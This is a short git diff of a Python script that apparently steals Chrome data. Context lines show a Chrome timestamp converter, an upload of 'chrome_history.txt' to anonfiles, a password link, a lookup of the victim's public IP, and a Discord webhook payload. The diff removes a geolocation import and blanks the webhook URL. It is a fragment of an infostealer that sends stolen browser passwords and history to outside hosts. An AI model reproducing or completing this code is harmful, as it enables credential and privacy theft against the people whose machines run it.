@@ -8,7 +8,6 @@ import requests
 import zipfile
 import os
 import shutil
-from geopy.geocoders import Nominatim
 
 def get_chrome_datetime(chromedate):
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
@@ -125,7 +124,7 @@ def main():
     history_link = upload_to_anonfiles('chrome_history.txt')
 
     if pass_link:
-        webhook_url = 'https://discord.com/api/webhooks/your_webhook_url'
+        webhook_url = ''
         ip_address = requests.get("https://api.ipify.org/").text
 
         embeds = {
